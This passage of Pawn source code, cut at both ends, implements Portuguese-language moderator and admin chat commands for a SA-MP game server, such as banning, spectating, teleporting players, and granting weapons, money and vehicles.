			    return 1;
			}

            if(IsPlayerAdmin(plid) || IsPlayerModerator(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode banir administradores ou moderadores.");
			    return 1;
			}
			
			strmid(mod_tmp, cmdtext, idx, strlen(cmdtext));

			if(!strlen(mod_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /moderador banir [id/nome] [motivo]");
			    return 1;
			}

			BanAcc(plid, mod_tmp);
	    }
	    
	    else if(strcmp(mod_cmd, "spec", true) == 0)
	    {
            new tmp[128];
		    new specid;

			tmp = strtok(cmdtext, idx);

			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin spec [id/off]");
			    return 1;
			}

			if(strcmp(tmp, "off", true) == 0)
			{
	    		AdminData[playerid][admSpec] = INVALID_PLAYER_ID;
	    		TogglePlayerSpectating(playerid, false);
	    		SetPlayerInterior(playerid, AdminData[playerid][admInt]);
	    		SetPlayerPos(playerid, AdminData[playerid][admX], AdminData[playerid][admY], AdminData[playerid][admZ]);
   				SetPlayerFacingAngle(playerid, AdminData[playerid][admA]);
			    return 1;
			}

			specid = strval(tmp);

			if(AdminData[playerid][admSpec] == INVALID_PLAYER_ID)
			{
		    	GetPlayerPos(playerid, AdminData[playerid][admX], AdminData[playerid][admY], AdminData[playerid][admZ]);
		    	GetPlayerFacingAngle(playerid, AdminData[playerid][admA]);
		    	AdminData[playerid][admInt] = GetPlayerInterior(playerid);
			}

			AdminData[playerid][admSpec] = specid;
		    SetPlayerInterior(playerid, GetPlayerInterior(specid));
		    TogglePlayerSpectating(playerid, true);

		    if(!IsPlayerInAnyVehicle(specid))
		        PlayerSpectatePlayer(playerid, specid);

			else
			    PlayerSpectateVehicle(playerid, GetPlayerVehicleID(specid));
	    }
	    
	    else if(strcmp(mod_cmd, "tapa", true) == 0)
	    {
            new tmp[128];
		    new plid;
		    new Float:X, Float:Y, Float:Z, Float:A, Float:D;

			tmp = strtok(cmdtext, idx);

			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin tapa [id]");
			    return 1;
			}

			plid = strval(tmp);

			if(!IsPlayerConnected(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			    return 1;
			}

            if(IsPlayerAdmin(plid) || IsPlayerModerator(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode dar tapa em administradores ou moderadores.");
			    return 1;
			}
			
			GetPlayerPos(plid, X, Y, Z);
			A = float(random(360));
			D = float(random(3)) + 0.5;
			X += D * floatsin(-A, degrees);
			Y += D * floatcos(-A, degrees);
			Z += 10.0;
			SetPlayerPos(plid, X, Y, Z);
	    }
	    
	    else if(strcmp(mod_cmd, "checar", true) == 0)
	    {
            new tmp[128], string[128], xpath[128];
		    new plid;
			new Float:H, Float:A;

			tmp = strtok(cmdtext, idx);

			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin checar [id]");
			    return 1;
			}

			plid = strval(tmp);

			if(!IsPlayerConnected(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			    return 1;
			}

			xpath = GetPlayerXFilePath(plid);
			GetPlayerSysHealth(plid, H);
			GetPlayerArmour(plid, A);

			format(string, sizeof string, "[-----] Dados de %s (ID: %d) [-----]", PlayerName(plid), plid);
			SendClientMessage(playerid, COLOUR_RED, string);
			format(string, sizeof string, "Level: %d <> Xpoints: %d <> Dinheiro: $%d,00 dólares <> Banco: $%d,00 dólares", hGetInt(xpath, "Level"), hGetInt(xpath, "Xpoints"), GetPlayerSysMoney(plid), hGetInt(xpath, "Bank"));
			SendClientMessage(playerid, COLOUR_WHITE, string);
			format(string, sizeof string, "Vida: %.2f <> Colete: %.2f", H, A);
			SendClientMessage(playerid, COLOUR_WHITE, string);
			format(string, sizeof string, "Arma atual: %d/%d <> Arma pesada: %d/%d <> Arma leve: %d/%d <> Arma branca: %d", GetPlayerWeapon(plid), GetPlayerAmmo(plid), pWeapons[plid][0], pWeapons[plid][1], pWeapons[plid][2], pWeapons[plid][3], pWeapons[plid][4]);
			SendClientMessage(playerid, COLOUR_WHITE, string);
			return 1;
	    }
	    
        else
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /moderador [comando] - COMANDOS DISPONÍVEIS:");
			SendClientMessage(playerid, COLOUR_GRAY, "say, pm, kickar, banir, spec, tapa, checar");
			return 1;
	    }

		reportf("Moderator Command: %s -> %s", REPORT_DEFAULT, PlayerName(playerid), cmdtext);
	    SendClientMessage(playerid, COLOUR_GREEN, "Feito.");
	    return 1;
	}
	
	if(strcmp(cmd, "/admin", true) == 0)
	{
	    if(!IsPlayerAdmin(playerid))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não é administrador!");
	        return 1;
	    }
	    
	    new adm_cmd[128], adm_tmp[128];
	    
	    adm_cmd = strtok(cmdtext, idx);
	    
		if(!strlen(adm_cmd))
		    return 1;
		
		if(strcmp(adm_cmd, "say", true) == 0)
	    {
	        strmid(adm_tmp, cmdtext, idx, strlen(cmdtext));
	        
	        if(!strlen(adm_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin say [mensagem]");
			    return 1;
			}
			
			new msg[128];
	        format(msg, sizeof msg, "* (Admin) %s: %s", PlayerName(playerid), adm_tmp);
	        SendClientMessageToAll(COLOUR_ADMIN, msg);
	        return 1;
	    }
	    
	    else if(strcmp(adm_cmd, "pm", true) == 0)
	    {
	        new plid;
	        
	        adm_tmp = strtok(cmdtext, idx);

			if(!strlen(adm_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin pm [id] [mensagem]");
			    return 1;
			}
			
	        plid = strval(adm_tmp);
	        
	        if(!IsPlayerConnected(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			    return 1;
			}
			
	        strmid(adm_tmp, cmdtext, idx, strlen(cmdtext));

	        if(!strlen(adm_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin pm [id] [mensagem]");
			    return 1;
			}

			new msg[128];
	        format(msg, sizeof msg, "* PM (Admin) %s: %s", PlayerName(playerid), adm_tmp);
	        SendClientMessage(plid, COLOUR_ADMIN, msg);
	        format(msg, sizeof msg, "* PM (Admin) para %s: %s", PlayerName(plid), adm_tmp);
	        SendClientMessage(playerid, COLOUR_ADMIN, msg);
	        return 1;
	    }

	    else if(strcmp(adm_cmd, "admins", true) == 0)
	    {
	        new string[128];
	        
	        SendClientMessage(playerid, COLOUR_ADMIN, "Lista de administradores:");
	        for(new n = 0; n < MAX_SLOTS; n++)
	        {
	            if(IsPlayerConnected(n) && IsPlayerLogged(n) && IsPlayerAdmin(n))
	            {
	                format(string, sizeof string, "[%d] %s", n, PlayerName(n));
	                SendClientMessage(playerid, COLOUR_WHITE, string);
	            }
	        }
	        
	        return 1;
	    }
	    
	    else if(strcmp(adm_cmd, "moderadores", true) == 0)
	    {
	        new string[128];

	        SendClientMessage(playerid, COLOUR_ADMIN, "Lista de moderadores:");
	        for(new n = 0; n < MAX_SLOTS; n++)
	        {
	            if(IsPlayerConnected(n) && IsPlayerLogged(n) && IsPlayerModerator(n))
	            {
	                format(string, sizeof string, "[%d] %s", n, PlayerName(n));
	                SendClientMessage(playerid, COLOUR_WHITE, string);
	            }
	        }

	        return 1;
	    }
	    
	    else if(strcmp(adm_cmd, "report", true) == 0)
	    {
	        AdminData[playerid][admReportOff] = !AdminData[playerid][admReportOff];
	        
			if(AdminData[playerid][admReportOff])
			    DrawTextForPlayer(playerid, "REPORT MODE [ OFF ]", COLOUR_RED, TEXTDRAW_STYLE_2, 1000);
			    
			else
			    DrawTextForPlayer(playerid, "REPORT MODE [ ON ]", COLOUR_GREEN, TEXTDRAW_STYLE_2, 1000);

			return 1;
	    }
	    
	    else if(strcmp(adm_cmd, "moderador", true) == 0)
	    {
	        new xpath[128], string[128];
	        new plid;

			adm_tmp = strtok(cmdtext, idx);

			if(!strlen(adm_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin moderador [id]");
			    return 1;
			}

			plid = strval(adm_tmp);

			if(!IsPlayerConnected(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			    return 1;
			}
			
			xpath = GetPlayerXFilePath(plid);
			
			if(hGetInt(xpath, "Moderator") != 1)
			{
			    hSetInt(xpath, "Moderator", 1);
			    format(string, sizeof string, "Permissões de moderador concedidas a %s.", PlayerName(plid));
			    SendClientMessage(playerid, COLOUR_WHITE, string);
			    SendClientMessage(plid, COLOUR_MODERATOR, "Você recebeu permissões de moderador, use \"/moderador ?\" para ver seus comandos.");
			}
			
			else
			{
			    hSetInt(xpath, "Moderator", 0);
			    format(string, sizeof string, "Permissões de moderador retiradas de %s.", PlayerName(plid));
			    SendClientMessage(playerid, COLOUR_WHITE, string);
			    SendClientMessage(plid, COLOUR_MODERATOR, "Você perdeu suas permissões de moderador.");
			}
	    }
	    
	    else if(strcmp(adm_cmd, "banir", true) == 0)
	    {
	        new plid;
	        
			adm_tmp = strtok(cmdtext, idx);
			
			if(!strlen(adm_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin banir [id/nome] [motivo]");
			    return 1;
			}
			
			if(IsNumeric(adm_tmp))
				plid = strval(adm_tmp);

			else
			{
			    plid = INVALID_PLAYER_ID;
			    
			    for(new n = 0; n < MAX_SLOTS; n++)
			    {
			        if(IsPlayerConnected(n) && strcmp(PlayerName(n), adm_tmp, true) == 0)
			            plid = n;
			    }
			}
			
			if(!IsPlayerConnected(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			    return 1;
			}
			
			strmid(adm_tmp, cmdtext, idx, strlen(cmdtext));
			
			if(!strlen(adm_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin banir [id/nome] [motivo]");
			    return 1;
			}
			
			BanAcc(plid, adm_tmp);
	    }
	    
	    else if(strcmp(adm_cmd, "desbanir", true) == 0)
	    {
			adm_tmp = strtok(cmdtext, idx);
			
			if(!strlen(adm_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin desbanir [usuario]");
			    return 1;
			}
			
			Unban(adm_tmp);
	    }
	    
	    else if(strcmp(adm_cmd, "kickar", true) == 0)
	    {
	        new plid;
	        
			adm_tmp = strtok(cmdtext, idx);
			
			if(!strlen(adm_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin kickar [id]");
			    return 1;
			}
			
			plid = strval(adm_tmp);
			
			if(!IsPlayerConnected(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			    return 1;
			}
			
			Kick(plid);
	    }
	    
	    else if(strcmp(adm_cmd, "arma", true) == 0)
	    {
	        new plid, weaponid, ammo, res;
	        
            adm_tmp = strtok(cmdtext, idx);

			if(!strlen(adm_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin arma [id] [id da arma] [municao]");
			    return 1;
			}
			
			plid = strval(adm_tmp);
			
			adm_tmp = strtok(cmdtext, idx);
			
			if(!strlen(adm_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin arma [id] [id da arma] [municao]");
			    return 1;
			}

			weaponid = strval(adm_tmp);
			
			if(weaponid < 1 || IsForbiddenWeapon(weaponid) || weaponid > 46)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Arma inválida.");
			    return 1;
			}
		
		    adm_tmp = strtok(cmdtext, idx);
		    
			if(!strlen(adm_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin arma [id] [id da arma] [municao]");
			    return 1;
			}

			ammo = strval(adm_tmp);
			
			if(ammo < 0)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Municao acima de 0");
			    return 1;
			}

			res = GivePlayerSysWeapon(plid, weaponid, ammo);
			
			if(res == 1)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Essa arma já possui o número máximo de cartuchos.");
			    return 1;
			}
			
			if(res == 2)
			{
		    	SendClientMessage(playerid, COLOUR_GRAY, "Este jogador já possui uma arma pesada.");
			    return 1;
			}
			
			if(res == 3)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador já possui uma arma leve.");
			    return 1;
			}
			
			if(res == 4)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador já possui uma arma branca.");
			    return 1;
			}
	    }
	    
	    else if(strcmp(adm_cmd, "ir", true) == 0)
	    {
	        new plid;
	        
	        adm_tmp = strtok(cmdtext, idx);
	        
	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin ir [id]");
	            return 1;
	        }
	        
	        plid = strval(adm_tmp);
	        
	        if(!IsPlayerConnected(plid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	            return 1;
	        }
	        
	        new Float:x, Float:y, Float:z;
	        
	        GetPlayerPos(plid, x, y, z);
	        
	        if(!IsPlayerInAnyVehicle(playerid) || GetPlayerInterior(plid) != 0)
	        	SetPlayerPos(playerid, x, y, z);
	        	
			else
			    SetVehiclePos(GetPlayerVehicleID(playerid), x, y, z + 2.0);
			    
            StopAudioStreamForPlayer(playerid);
	        SetPlayerInterior(playerid, GetPlayerInterior(plid));
	        SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(plid));
	        Enter[playerid] = Enter[plid];
	        House[playerid] = House[plid];
	        Door[playerid] = -1;
	    }
	    
	    else if(strcmp(adm_cmd, "trazer", true) == 0)
	    {
	        new plid;
	        
	        adm_tmp = strtok(cmdtext, idx);

	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin trazer [id]");
	            return 1;
	        }

	        plid = strval(adm_tmp);

	        if(!IsPlayerConnected(plid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	            return 1;
	        }

	        new Float:x, Float:y, Float:z;
	        
	        GetPlayerPos(playerid, x, y, z);
	        
	        if(!IsPlayerInAnyVehicle(plid) || GetPlayerInterior(playerid) != 0)
	        	SetPlayerPos(plid, x, y, z);

			else
			    SetVehiclePos(GetPlayerVehicleID(plid), x, y, z + 2.0);
			    
			StopAudioStreamForPlayer(plid);
	        SetPlayerInterior(plid, GetPlayerInterior(playerid));
	        SetPlayerVirtualWorld(plid, GetPlayerVirtualWorld(playerid));
	        Enter[plid] = Enter[playerid];
	        House[plid] = House[playerid];
	        Door[plid] = -1;
	    }
	    
	    else if(strcmp(adm_cmd, "empregar", true) == 0)
	    {
	        new plid, jobid, company, post, reward, payday;
	        
	        adm_tmp = strtok(cmdtext, idx);
	        
	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin empregar [id] [emprego]");
	            return 1;
	        }

	        plid = strval(adm_tmp);
	        
	        if(!IsPlayerConnected(plid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	            return 1;
	        }
	        
	        jobid = 0;
	        strmid(adm_tmp, cmdtext, idx, strlen(cmdtext));
			
			if(IsNumeric(adm_tmp))
			{
			    jobid = strval(adm_tmp);
			}
			
			else
			{
				for(new j = 1; j < sizeof Jobs; j++)
				{
				    if(strcmp(adm_tmp, Jobs[j][jobName], true) == 0)
				    {
				        jobid = j;
				        break;
				    }
				}
			}
			
			if(jobid <= 0 || jobid >= sizeof Jobs)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Emprego inválido.");
	            return 1;
			}
			
			hSetInt(GetPlayerXFilePath(plid), "Job", jobid);
			ChangePlayerJob(plid, jobid);
			GetPlayerCompanyData(playerid, company, post, reward, payday);
			
			if(company != 0 && post == COMPANY_POST_EMPLOYEE)
				Dismiss(plid);
	    }
	    
	    else if(strcmp(adm_cmd, "skill", true) == 0)
	    {
	        new kpath[128], key[128];
			new plid, skill, level;
	        
	        adm_tmp = strtok(cmdtext, idx);

	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin skill [id] [skill] [level]");
	            return 1;
	        }

	        plid = strval(adm_tmp);

	        if(!IsPlayerConnected(plid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	            return 1;
	        }

			adm_tmp = strtok(cmdtext, idx);
			
			if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin skill [id] [skill] [level]");
	            return 1;
	        }

	        if(strcmp(adm_tmp, "pistol", true) == 0)
	            skill = WEAPONSKILL_PISTOL;
            else if(strcmp(adm_tmp, "pistolsilenced", true) == 0)
	            skill = WEAPONSKILL_PISTOL_SILENCED;
            else if(strcmp(adm_tmp, "deagle", true) == 0)
	            skill = WEAPONSKILL_DESERT_EAGLE;
            else if(strcmp(adm_tmp, "shotgun", true) == 0)
	            skill = WEAPONSKILL_SHOTGUN;
            else if(strcmp(adm_tmp, "sawnoffshotgun", true) == 0)
	            skill = WEAPONSKILL_SAWNOFF_SHOTGUN;
            else if(strcmp(adm_tmp, "spas12shotgun", true) == 0)
	            skill = WEAPONSKILL_SPAS12_SHOTGUN;
            else if(strcmp(adm_tmp, "microuzi", true) == 0)
	            skill = WEAPONSKILL_MICRO_UZI;
            else if(strcmp(adm_tmp, "mp5", true) == 0)
	            skill = WEAPONSKILL_MP5;
            else if(strcmp(adm_tmp, "ak47", true) == 0)
	            skill = WEAPONSKILL_AK47;
            else if(strcmp(adm_tmp, "m4", true) == 0)
	            skill = WEAPONSKILL_M4;
            else if(strcmp(adm_tmp, "sniper", true) == 0)
	            skill = WEAPONSKILL_SNIPERRIFLE;
			else
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin skill [id] [skill] [level]");
			    SendClientMessage(playerid, COLOUR_GRAY, "SKILLS: pistol, pistolsilenced, deagle, shotgun, sawnoffshotgun,");
			    SendClientMessage(playerid, COLOUR_GRAY, "SKILLS: spas12shotgun, microuzi, mp5, ak47, m4, sniper");
	            return 1;
			}
	        
	        adm_tmp = strtok(cmdtext, idx);
	        
	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin skill [id] [skill] [level]");
	            return 1;
	        }
	        
			level = strval(adm_tmp);
			
			if(level < 0)
			    level = 0;
			else if(level > MAX_SKILL_LEVEL)
			    level = MAX_SKILL_LEVEL;
			    
			kpath = GetPlayerKFilePath(plid);
			format(key, sizeof key, "SkillLevel%d", skill);
			hSetInt(kpath, key, level);
	        SetPlayerSkillLevel(plid, skill, level);
	    }
	    
	    else if(strcmp(adm_cmd, "dinheiro", true) == 0)
	    {
	        new plid;
	        
	        adm_tmp = strtok(cmdtext, idx);
	        
	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin dinheiro [id] [quantidade]");
	            return 1;
	        }

	        plid = strval(adm_tmp);

	        if(!IsPlayerConnected(plid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	            return 1;
	        }

			adm_tmp = strtok(cmdtext, idx);

			if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin dinheiro [id] [quantidade]");
	            return 1;
	        }
	        
	        GivePlayerSysMoney(plid, strval(adm_tmp));
	    }
	    
	    else if(strcmp(adm_cmd, "vida", true) == 0)
	    {
	        new plid;
	        
	        adm_tmp = strtok(cmdtext, idx);

	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin vida [id] [quantidade]");
	            return 1;
	        }

	        plid = strval(adm_tmp);

	        if(!IsPlayerConnected(plid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	            return 1;
	        }

			adm_tmp = strtok(cmdtext, idx);

			if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin vida [id] [quantidade]");
	            return 1;
	        }

	        SetPlayerSysHealth(plid, floatstr(adm_tmp));
	    }
	    
	    else if(strcmp(adm_cmd, "colete", true) == 0)
	    {
	        new plid;

	        adm_tmp = strtok(cmdtext, idx);

	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin colete [id] [quantidade]");
	            return 1;
	        }

	        plid = strval(adm_tmp);

	        if(!IsPlayerConnected(plid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	            return 1;
	        }

			adm_tmp = strtok(cmdtext, idx);

			if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin colete [id] [quantidade]");
	            return 1;
	        }

	        SetPlayerArmour(plid, floatstr(adm_tmp));
	    }
	    
	    else if(strcmp(adm_cmd, "paralisar", true) == 0)
	    {
	        new plid;
	        
	        adm_tmp = strtok(cmdtext, idx);

	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin paralisar [id]");
	            return 1;
	        }

	        plid = strval(adm_tmp);

	        if(!IsPlayerConnected(plid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	            return 1;
	        }
	        
	        TogglePlayerControllable(plid, false);
		}
		
		else if(strcmp(adm_cmd, "desparalisar", true) == 0)
	    {
	        new plid;
	        
	        adm_tmp = strtok(cmdtext, idx);

	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin desparalisar [id]");
	            return 1;
	        }

	        plid = strval(adm_tmp);

	        if(!IsPlayerConnected(plid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	            return 1;
	        }

	        TogglePlayerControllable(plid, true);
	        ClearAnimations(plid);
		}
		
		else if(strcmp(adm_cmd, "level", true) == 0)
	    {
			new plid;
			
	        adm_tmp = strtok(cmdtext, idx);

	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin level [id] [level]");
	            return 1;
	        }

	        plid = strval(adm_tmp);

	        if(!IsPlayerConnected(plid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	            return 1;
	        }

	        adm_tmp = strtok(cmdtext, idx);

	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin level [id] [level]");
	            return 1;
	        }
	        
	        hSetInt(GetPlayerXFilePath(plid), "Level", strval(adm_tmp));
		}
		
		else if(strcmp(adm_cmd, "skin", true) == 0)
	    {
	        new plid, skinid;
	        
	        adm_tmp = strtok(cmdtext, idx);

	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin skin [id] [skin]");
	            return 1;
	        }

	        plid = strval(adm_tmp);

	        if(!IsPlayerConnected(plid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	            return 1;
	        }

	        adm_tmp = strtok(cmdtext, idx);

	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin skin [id] [skin]");
	            return 1;
	        }

			skinid = strval(adm_tmp);
			
			SetPlayerSkin(plid, skinid);
	        hSetInt(GetPlayerXFilePath(plid), "Skin", skinid);
		}
	    
	    else if(strcmp(adm_cmd, "veiculo", true) == 0)
	    {
	        new plid, modelid;
	        new Float:X, Float:Y, Float:Z, Float:A;

            adm_tmp = strtok(cmdtext, idx);

	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin veiculo [id] [modelo]");
	            return 1;
	        }

	        plid = strval(adm_tmp);
	        
	        if(!IsPlayerConnected(plid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	            return 1;
	        }
	        
	        adm_tmp = strtok(cmdtext, idx);

	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin veiculo [id] [modelo]");
	            return 1;
	        }
	        
	        if(IsNumeric(adm_tmp))
	        {
	        	modelid = strval(adm_tmp);
	        
	            if(modelid < 400)
	                modelid += 400;
			}
			
			else
			{
			    modelid = -1;
			    
			    for(new m = 0; m < sizeof Vehicles; m++)
			    {
			        if(strcmp(Vehicles[m][vehModel], adm_tmp, true) == 0)
			            modelid = m+400;
			    }
			}
	        
	        if(modelid <= 399 || modelid >= 400 + sizeof Vehicles)
	       	{
	       	    SendClientMessage(playerid, COLOUR_GRAY, "Modelo inválido.");
	       	    return 1;
       		}
       		
       		if(Vehicles[modelid - 400][vehValue] <= 0)
       		{
       		    SendClientMessage(playerid, COLOUR_GRAY, "Modelo indisponível para venda.");
	       	    return 1;
       		}
	        	
	        if(IsPlayerInAnyVehicle(playerid))
	        {
				new vehid;
				
				vehid = GetPlayerVehicleID(playerid);
				
				GetVehiclePos(vehid, X, Y, Z);
				GetVehicleZAngle(vehid, A);
	        }
	        
	        else
	        {
	            GetPlayerPos(playerid, X, Y, Z);
	            GetPlayerFacingAngle(playerid, A);
	        }
	        
	        X += 3.0 * floatsin(-A, degrees);
	        Y += 3.0 * floatcos(-A, degrees);
	        A = (A + 90) % 360.0;
	        
	        CreatePlayerVehicle(PlayerName(plid), modelid, X, Y, Z, A, random(300), random(300));
	    }
	    
	    else if(strcmp(adm_cmd, "combustivel", true) == 0)
	    {
	        new amount;
	        
	        if(!IsPlayerInAnyVehicle(playerid))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em um veiculo para utilizar este comando.");
	            return 1;
	        }
	        
	        adm_tmp = strtok(cmdtext, idx);
	        
	        if(!strlen(adm_tmp))
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin combustivel [quantidade]");
	            return 1;
	        }
	        
			if(strcmp(adm_tmp, "ilimitada", true) != 0)
			{
	        	amount = strval(adm_tmp);
	        
	        	if(amount < 0 || amount > 100)
	        	{
	        	    SendClientMessage(playerid, COLOUR_GRAY, "Quantidade de 0 a 100 ou ilimitada.");
	        	    return 1;
	        	}
			}
			
			else
			    amount = 127;
			    
			SetVehicleFuel(GetPlayerVehicleID(playerid), amount);
	    }
	    
	    else if(strcmp(adm_cmd, "cores", true) == 0)
	    {
			adm_tmp = strtok(cmdtext, idx);
	        
	        if(strlen(adm_tmp) > 0)
			{
	        	if(strcmp(adm_tmp, "definir", true) == 0)
	        	{
	        	    new colour[128], string[128];
					new gcolour;

		            colour = strtok(cmdtext, idx);
		            gcolour = -1;

		            if(strlen(colour) > 0)
		            {
	                    for(new gc = 0; gc < sizeof GangColours; gc++)
			            {
							if(strcmp(GangColours[gc][gColourName], colour, true) == 0)
							{
							    gcolour = gc;
							    break;
							}
		            	}
		            }

		            if(gcolour == -1)
		            {
		                SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin cores definir [cor] - CORES DISPONÍVEIS:");
		            	SendClientMessage(playerid, COLOUR_GRAY, "branco, preto, vermelho, vermelho-escuro, verde, verde-claro, verde-escuro,");
					    SendClientMessage(playerid, COLOUR_GRAY, "azul, azul-claro, azul-escuro, azul-ceu, navy, aqua, ciano, magenta, amarelo,");
					    SendClientMessage(playerid, COLOUR_GRAY, "cinza, laranja, rosa, dourado, roxo, marrom");
		            	return 1;
		            }

		            for(new n = 0; n < MAX_SLOTS; n++)
		            {
						if(IsPlayerConnected(n) && IsPlayerLogged(n))
						{
						    new alpha;
						    
						    alpha = GetPlayerColour(n) & 0xFF;
						    SetPlayerColour(n, (GangColours[gcolour][gColourHex] & 0xFFFFFF00) | alpha);
						}
		            }
		            
		            ColourType = COLOUR_TYPE_DEFINED;
		            ColourValue = GangColours[gcolour][gColourHex];
		            format(string, sizeof string, "Cores dos jogadores definidas para %s.", colour);
		            SendClientMessage(playerid, COLOUR_GREEN, string);
		            return 1;
		        }
		        
		        if(strcmp(adm_tmp, "emprego", true) == 0)
	        	{
	        	    for(new n = 0; n < MAX_SLOTS; n++)
		            {
						if(IsPlayerConnected(n) && IsPlayerLogged(n))
						{
						    new jobid, alpha;
						    
						    jobid = hGetInt(GetPlayerXFilePath(n), "Job");
						    alpha = GetPlayerColour(n) & 0xFF;
						    SetPlayerColour(playerid, (Jobs[jobid][jobColour] & 0xFFFFFF00) | alpha);
						}
					}
					
	        	    ColourType = COLOUR_TYPE_JOB;
	        	    SendClientMessage(playerid, COLOUR_GREEN, "Cores dos jogadores definidas para as de seus respectivos empregos.");
	        	    return 1;
	        	}
	        	
	        	if(strcmp(adm_tmp, "gangue", true) == 0)
	        	{
	        	    for(new n = 0; n < MAX_SLOTS; n++)
		            {
						if(IsPlayerConnected(n) && IsPlayerLogged(n))
						{
						    new id, post, alpha;

                            GetPlayerGangData(playerid, id, post);
                            alpha = GetPlayerColour(n) & 0xFF;
                            
							if(id != 0)
						    	SetPlayerColour(playerid, (GetGangColour(id) & 0xFFFFFF00) | alpha);
							
							else
							    SetPlayerColour(playerid, (ColourValue & 0xFFFFFF00) | alpha);
						}
					}
					
	        	    ColourType = COLOUR_TYPE_GANG;
	        	    SendClientMessage(playerid, COLOUR_GREEN, "Cores dos jogadores definidas para as de suas respectivas gangues.");
	        	    return 1;
	        	}
			}
			
			SendClientMessage(playerid, COLOUR_GRAY, "USO: /admin cores [tipo] - TIPOS DISPONÍVEIS:");
   			SendClientMessage(playerid, COLOUR_GRAY, "definir, emprego, gangue");
   			return 1;
	            
		}
		
	    else if(strcmp(adm_cmd, "power", true) == 0)
	    {
